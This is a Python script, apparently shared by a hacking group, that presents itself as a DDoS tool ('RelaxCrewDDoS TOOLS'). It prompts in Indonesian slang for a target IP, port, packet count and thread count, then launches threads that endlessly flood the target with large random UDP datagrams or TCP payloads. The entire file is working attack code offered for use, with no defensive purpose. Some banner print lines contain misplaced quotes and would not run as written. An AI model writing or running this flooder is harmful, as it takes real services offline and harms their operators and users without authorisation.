#!/usr/bin/env python3
#Code by Han
import time
import random
import os
import socket
import threading

os.system("clear")

print("\033[1;32m#########################################################")
print("#------------------------[\033[1;91mRelaxCrewDDoS TOOLS\033[1;32m]---------------------#")
print("#-------------------------------------------------------#")
print("#                                                       #")
print("#\033[1;91mCreator:Han Samp  \033[1;32m##      ###       ##                #")
print("#\033[1;91mTeam   : RelaxCrew        \033[1;32m##     #          ##                #")
print("#\033[1;91mVersion:0.2        \033[1;32m##      ###       ##                #")
print("#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##")                #"
print("#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######")            #"
print("#########################################################")

print("""
██████╗░███████╗██╗░░░░░░█████╗░██╗░░██╗░█████╗░██████╗░███████╗░██╗░░░░░░░██╗██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔════╝██║░░░░░██╔══██╗╚██╗██╔╝██╔══██╗██╔══██╗██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝
██████╔╝█████╗░░██║░░░░░███████║░╚███╔╝░██║░░╚═╝██████╔╝█████╗░░░╚██╗████╗██╔╝██║░░██║██║░░██║██║░░██║╚█████╗░
██╔══██╗██╔══╝░░██║░░░░░██╔══██║░██╔██╗░██║░░██╗██╔══██╗██╔══╝░░░░████╔═████║░██║░░██║██║░░██║██║░░██║░╚═══██╗
██║░░██║███████╗███████╗██║░░██║██╔╝╚██╗╚█████╔╝██║░░██║███████╗░░╚██╔╝░╚██╔╝░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░""")
    
print("Subs Han SA:MP")

ip = str(input(" IP YG MAU LU DDOS:"))
port = int(input(" PORT YANG MAU LU DDOS:"))
choice = str(input(" Password:"))
times = int(input(" PAKET NYA MO BRP?:"))
threads = int(input(" Threads MO BRP?:"))
def run():
	data = random._urandom(90000)
	i = random.choice(("\033[31mAHHH KOK NEMBUSS","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[31mCROOT...CROTTT")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(90000)
	i = random.choice(("\033[31mAHHHHHH KOKKK NEMBUSSS","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\033[31mHIYAA KENA DDOS","","")
		except:
			s.close()
			print("[*] Error")
            
for relax21 in range(threads):
	if choice == 'relax21':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
